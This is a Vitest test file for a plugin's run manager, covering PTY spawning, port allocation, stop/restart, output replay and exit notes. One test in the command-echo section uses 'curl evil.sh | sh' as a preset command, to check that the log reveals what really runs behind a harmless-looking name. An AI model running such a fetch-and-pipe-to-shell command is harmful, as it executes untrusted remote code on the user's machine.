import { beforeEach, describe, expect, it, vi } from "vitest";
import type {
  PluginLogger,
  PluginServices,
  PluginSessionEvent,
} from "@keepdeck/plugin-api";
import { createRunManager, type RunManager } from "./manager";

/** One fake PTY per spawn: capture the event callback, expose a close spy that
 * emits the exit event like the real backend does. */
const pty = (() => {
  const spawned: Array<{
    opts: Record<string, unknown>;
    emit: (e: PluginSessionEvent) => void;
    close: ReturnType<typeof vi.fn>;
    resize: ReturnType<typeof vi.fn>;
    write: ReturnType<typeof vi.fn>;
  }> = [];
  const spawn = vi.fn(
    async (
      opts: Record<string, unknown>,
      onEvent: (e: PluginSessionEvent) => void,
    ) => {
      const record = {
        opts,
        emit: onEvent,
        close: vi.fn(async () => {
          onEvent({ type: "exit", code: null });
        }),
        resize: vi.fn(async () => {}),
        write: vi.fn(async () => {}),
      };
      spawned.push(record);
      return {
        id: `s${spawned.length}`,
        write: record.write,
        resize: record.resize,
        close: record.close,
      };
    },
  );
  return { spawned, spawn };
})();

const ports = { allocate: vi.fn() };
const log: PluginLogger = { info: vi.fn(), warn: vi.fn(), error: vi.fn() };

const services = {
  sessions: { spawn: pty.spawn },
  ports,
  opener: { openUrl: vi.fn(), openPath: vi.fn() },
} as unknown as PluginServices;

let manager: RunManager;

beforeEach(() => {
  vi.clearAllMocks();
  pty.spawned.length = 0;
  ports.allocate.mockResolvedValue(17_040);
  manager = createRunManager(services, log);
});

const out = (...bytes: number[]): PluginSessionEvent => ({
  type: "output",
  bytes: new Uint8Array(bytes),
});

const DEV = { presetId: "run-1", command: "pnpm dev", name: "Dev" };
const TARGET = { worktree: "/wt/1", branch: "kd/1" };

describe("launchRun", () => {
  it("allocates the port, spawns shell -c with the env contract, snapshots running", async () => {
    const id = await manager.launchRun("ws-1", TARGET, DEV);

    expect(ports.allocate).toHaveBeenCalledWith("/wt/1");
    expect(pty.spawned[0].opts).toMatchObject({
      command: null,
      args: ["-c", "pnpm dev"],
      cwd: "/wt/1",
      env: [
        ["KEEPDECK_WORKTREE", "/wt/1"],
        ["KEEPDECK_BRANCH", "kd/1"],
        ["KEEPDECK_PORT", "17040"],
      ],
    });
    const [session] = manager.getSessions();
    expect(session).toMatchObject({
      id,
      wsId: "ws-1",
      name: "Dev",
      presetId: "run-1",
      port: 17_040,
      status: { kind: "running" },
    });
  });

  it("a failed port probe launches anyway, without KEEPDECK_PORT", async () => {
    ports.allocate.mockRejectedValue(new Error("exhausted"));
    await manager.launchRun("ws-1", TARGET, DEV);

    const env = (pty.spawned[0].opts.env as [string, string][]).map(([k]) => k);
    expect(env).not.toContain("KEEPDECK_PORT");
    expect(manager.getSessions()[0].port).toBeUndefined();
  });

  it("exit and spawn failure land in the status", async () => {
    await manager.launchRun("ws-1", TARGET, DEV);
    pty.spawned[0].emit({ type: "exit", code: 1 });
    expect(manager.getSessions()[0].status).toEqual({ kind: "exited", code: 1 });

    pty.spawn.mockRejectedValueOnce(new Error("no shell"));
    // A DIFFERENT preset: same-preset relaunches reuse the dead session.
    await manager.launchRun("ws-1", TARGET, {
      presetId: "run-2",
      command: "pnpm worker",
      name: "Worker",
    });
    await vi.waitFor(() => {
      expect(manager.getSessions()[1].status).toEqual({
        kind: "failed",
        message: expect.stringContaining("no shell") as unknown as string,
      });
    });
  });

  it("snapshots are stable between changes", async () => {
    await manager.launchRun("ws-1", TARGET, DEV);
    const first = manager.getSessions();
    expect(manager.getSessions()).toBe(first);
    pty.spawned[0].emit(out(104, 105));
    // Output alone is not a session change — no snapshot churn.
    expect(manager.getSessions()).toBe(first);
  });
});

describe("writeRun", () => {
  it("forwards input to the live PTY handle", async () => {
    const id = await manager.launchRun("ws-1", TARGET, DEV);
    await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
    manager.writeRun(id, "y\r");
    expect(pty.spawned[0].write).toHaveBeenCalledWith("y\r");
  });

  it("drops input once the session has exited (no live handle)", async () => {
    const id = await manager.launchRun("ws-1", TARGET, DEV);
    await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
    pty.spawned[0].emit({ type: "exit", code: 0 });
    manager.writeRun(id, "y");
    expect(pty.spawned[0].write).not.toHaveBeenCalled();
  });

  it("ignores an unknown session id", () => {
    expect(() => manager.writeRun("nope", "x")).not.toThrow();
  });
});

describe("stop / restart / remove", () => {
  it("stopRun closes the handle (group kill behind it) and reports stopping → exited", async () => {
    const id = await manager.launchRun("ws-1", TARGET, DEV);
    await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));

    manager.stopRun(id);
    expect(pty.spawned[0].close).toHaveBeenCalled();
    // The fake close emitted the exit event, as the real backend does.
    expect(manager.getSessions()[0].status).toEqual({ kind: "exited", code: null });
  });

  it("honors a Stop clicked before the handle arrives (launch→spawn window)", async () => {
    let resolveSpawn!: () => void;
    const close = vi.fn(async () => {});
    pty.spawn.mockImplementationOnce(
      () =>
        new Promise((res) => {
          resolveSpawn = () =>
            res({ id: "s1", write: vi.fn(), resize: vi.fn(), close });
        }),
    );

    const id = await manager.launchRun("ws-1", TARGET, DEV);
    // The handle hasn't resolved yet, but the row already shows running.
    expect(manager.getSessions()[0].status.kind).toBe("running");

    manager.stopRun(id);
    expect(manager.getSessions()[0].status.kind).toBe("stopping");
    expect(close).not.toHaveBeenCalled(); // no handle to close yet

    resolveSpawn(); // the process finally exists
    await vi.waitFor(() => expect(close).toHaveBeenCalled());
  });

  it("restartRun respawns with a fresh port and a clean buffer", async () => {
    ports.allocate.mockResolvedValueOnce(17_040).mockResolvedValueOnce(17_050);
    const id = await manager.launchRun("ws-1", TARGET, DEV);
    await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
    pty.spawned[0].emit(out(111, 108, 100)); // "old"
    pty.spawned[0].emit({ type: "exit", code: 1 });

    await manager.restartRun(id);
    expect(pty.spawned).toHaveLength(2);
    expect(manager.getSessions()[0]).toMatchObject({
      port: 17_050,
      status: { kind: "running" },
    });
    // The old output must not replay into the fresh run's log — only the fresh
    // run's own command banner is there.
    let seen = "";
    manager.attachRun(id, {
      onOutput: (b) => {
        seen += new TextDecoder().decode(b);
      },
    });
    expect(seen).not.toContain("old");
    expect(seen).toContain("[run] pnpm dev");
  });

  it("restartRun clears the attached live terminal, not just the buffer", async () => {
    const id = await manager.launchRun("ws-1", TARGET, DEV);
    await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
    let seen = "";
    manager.attachRun(id, {
      onOutput: (b) => {
        seen += new TextDecoder().decode(b);
      },
    });
    pty.spawned[0].emit(out(111, 108, 100)); // "old"
    pty.spawned[0].emit({ type: "exit", code: 0 });
    seen = ""; // ignore everything up to the restart

    await manager.restartRun(id);
    // The live terminal is cleared (ANSI ED) before the fresh run's banner.
    expect(seen).toContain("\x1b[2J");
    expect(seen).toContain("[run] pnpm dev");
  });

  it("applies a resize requested before the handle arrived", async () => {
    let resolveSpawn!: () => void;
    const resize = vi.fn(async () => {});
    pty.spawn.mockImplementationOnce(
      () =>
        new Promise((res) => {
          resolveSpawn = () =>
            res({ id: "s1", write: vi.fn(), resize, close: vi.fn(async () => {}) });
        }),
    );
    const id = await manager.launchRun("ws-1", TARGET, DEV);
    manager.resizeRun(id, 100, 40); // handle not up yet — remembered, not lost
    expect(resize).not.toHaveBeenCalled();

    resolveSpawn();
    await vi.waitFor(() => expect(resize).toHaveBeenCalledWith(100, 40));
  });

  it("removeRun kills a live session and drops it from the snapshot", async () => {
    const id = await manager.launchRun("ws-1", TARGET, DEV);
    await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));

    manager.removeRun(id);
    expect(pty.spawned[0].close).toHaveBeenCalled();
    expect(manager.getSessions()).toHaveLength(0);
  });

  it("stopWorkspaceRuns takes down exactly that workspace's runs", async () => {
    await manager.launchRun("ws-1", TARGET, DEV);
    await manager.launchRun("ws-2", { worktree: "/wt/2" }, { command: "go run .", name: "srv" });
    await vi.waitFor(() => expect(pty.spawned).toHaveLength(2));

    manager.stopWorkspaceRuns("ws-1");
    const left = manager.getSessions();
    expect(left).toHaveLength(1);
    expect(left[0].wsId).toBe("ws-2");
    expect(pty.spawned[0].close).toHaveBeenCalled();
    expect(pty.spawned[1].close).not.toHaveBeenCalled();
  });

  it("stopAll kills every session — the deactivation reap", async () => {
    await manager.launchRun("ws-1", TARGET, DEV);
    await manager.launchRun("ws-2", { worktree: "/wt/2" }, { command: "go run .", name: "srv" });
    await vi.waitFor(() => expect(pty.spawned).toHaveLength(2));

    manager.stopAll();
    expect(pty.spawned[0].close).toHaveBeenCalled();
    expect(pty.spawned[1].close).toHaveBeenCalled();
    expect(manager.getSessions()).toHaveLength(0);
  });
});

describe("attachRun", () => {
  it("replays buffered output, then streams live", async () => {
    const id = await manager.launchRun("ws-1", TARGET, DEV);
    await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
    pty.spawned[0].emit(out(1, 2));

    // Drop the leading command banner (its own test covers it) and watch the
    // process bytes: replay first, then live, then nothing after detach.
    const seen: number[] = [];
    let banner = true;
    const record = (b: Uint8Array) => {
      if (banner) {
        banner = false; // the banner is the first chunk of every run
        return;
      }
      seen.push(...b);
    };
    const detach = manager.attachRun(id, { onOutput: record });
    expect(seen).toEqual([1, 2]); // replay
    pty.spawned[0].emit(out(3));
    expect(seen).toEqual([1, 2, 3]); // live

    detach();
    pty.spawned[0].emit(out(4));
    expect(seen).toEqual([1, 2, 3]); // detached views hear nothing
  });
});

describe("spawn failure output", () => {
  it("writes the failure reason into the session's own log", async () => {
    pty.spawn.mockRejectedValueOnce(
      new Error("No such file or directory (os error 2)"),
    );
    const id = await manager.launchRun("ws-1", { worktree: "/gone" }, {
      command: "pnpm dev",
      name: "Dev",
    });
    await vi.waitFor(() =>
      expect(manager.getSessions()[0].status.kind).toBe("failed"),
    );

    let seen = "";
    manager.attachRun(id, {
      onOutput: (b) => {
        seen += new TextDecoder().decode(b);
      },
    });
    expect(seen).toContain("spawn failed: ");
    expect(seen).toContain("No such file or directory");
  });
});

describe("exit note in the run's log", () => {
  it("a natural exit streams a grey [process exited (code)] line to the attached view", async () => {
    const id = await manager.launchRun("ws-1", TARGET, DEV);
    await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
    let seen = "";
    manager.attachRun(id, {
      onOutput: (b) => {
        seen += new TextDecoder().decode(b);
      },
    });

    pty.spawned[0].emit({ type: "exit", code: 1 });
    expect(seen).toContain("[process exited (1)]");
  });

  it("a user stop writes [stopped], not the kill signal's exit code", async () => {
    const id = await manager.launchRun("ws-1", TARGET, DEV);
    await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));

    manager.stopRun(id);
    // The fake close emitted the exit event (code null), as the backend does.
    let seen = "";
    manager.attachRun(id, {
      onOutput: (b) => {
        seen += new TextDecoder().decode(b);
      },
    });
    expect(seen).toContain("[stopped]");
    expect(seen).not.toContain("[process exited");
  });

  it("the note is buffered — a log opened after the exit still shows it", async () => {
    const id = await manager.launchRun("ws-1", TARGET, DEV);
    await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
    pty.spawned[0].emit(out(104, 105)); // "hi"
    pty.spawned[0].emit({ type: "exit", code: 0 });

    let seen = "";
    manager.attachRun(id, {
      onOutput: (b) => {
        seen += new TextDecoder().decode(b);
      },
    });
    expect(seen).toContain("hi");
    expect(seen).toContain("[process exited (0)]");
  });
});

describe("command echo", () => {
  it("opens the log with the exact command line, verbatim", async () => {
    const id = await manager.launchRun("ws-1", TARGET, {
      presetId: "run-1",
      name: "Build",
      command: "curl evil.sh | sh",
    });
    await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));

    let seen = "";
    manager.attachRun(id, {
      onOutput: (b) => {
        seen += new TextDecoder().decode(b);
      },
    });
    // The list shows the name "Build"; the log shows what actually runs.
    expect(seen).toContain("[run] curl evil.sh | sh");
  });

  it("re-echoes the current command on restart", async () => {
    const id = await manager.launchRun("ws-1", TARGET, DEV);
    await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
    await manager.restartRun(id);

    let seen = "";
    manager.attachRun(id, {
      onOutput: (b) => {
        seen += new TextDecoder().decode(b);
      },
    });
    expect(seen).toContain("[run] pnpm dev");
  });
});

describe("relaunch replaces, never piles", () => {
  it("launching a preset with a DEAD session in the same target reuses it", async () => {
    const id = await manager.launchRun("ws-1", TARGET, DEV);
    await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
    pty.spawned[0].emit(out(111));
    pty.spawned[0].emit({ type: "exit", code: 1 });

    // The preset was edited meanwhile — the relaunch carries the new command.
    const again = await manager.launchRun("ws-1", TARGET, {
      ...DEV,
      command: "pnpm dev --host",
    });
    expect(again).toBe(id);
    expect(manager.getSessions()).toHaveLength(1);
    expect(manager.getSessions()[0]).toMatchObject({
      id,
      command: "pnpm dev --host",
      status: { kind: "running" },
    });
    expect(pty.spawned).toHaveLength(2);
    // The dead run's output must not haunt the fresh log — only the new run's
    // command banner (with the updated command) is there.
    let seen = "";
    manager.attachRun(id, {
      onOutput: (b) => {
        seen += new TextDecoder().decode(b);
      },
    });
    expect(seen).toContain("[run] pnpm dev --host");
  });

  it("launching a preset already RUNNING in the target is a no-op", async () => {
    const id = await manager.launchRun("ws-1", TARGET, DEV);
    await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));

    const again = await manager.launchRun("ws-1", TARGET, DEV);
    expect(again).toBe(id);
    expect(pty.spawned).toHaveLength(1);
    expect(manager.getSessions()).toHaveLength(1);
  });

  it("the same preset in ANOTHER target is a separate instance", async () => {
    await manager.launchRun("ws-1", TARGET, DEV);
    await manager.launchRun("ws-1", { worktree: "/wt/2" }, DEV);
    expect(manager.getSessions()).toHaveLength(2);
  });
});

describe("removeDeadRunsFor", () => {
  it("sweeps the preset's dead sessions and leaves the running ones alone", async () => {
    await manager.launchRun("ws-1", TARGET, DEV);
    await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
    pty.spawned[0].emit({ type: "exit", code: 1 });
    const live = await manager.launchRun("ws-1", { worktree: "/wt/2" }, DEV);
    await vi.waitFor(() => expect(pty.spawned).toHaveLength(2));

    manager.removeDeadRunsFor("ws-1", "run-1");
    const left = manager.getSessions();
    expect(left.map((s) => s.id)).toEqual([live]);
    expect(left[0].status.kind).toBe("running");
    expect(pty.spawned[1].close).not.toHaveBeenCalled();
  });

  it("touches nothing of other presets or workspaces", async () => {
    await manager.launchRun("ws-1", TARGET, { presetId: "run-2", command: "x", name: "x" });
    await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
    pty.spawned[0].emit({ type: "exit", code: 1 });

    manager.removeDeadRunsFor("ws-1", "run-1");
    expect(manager.getSessions()).toHaveLength(1);
  });
});
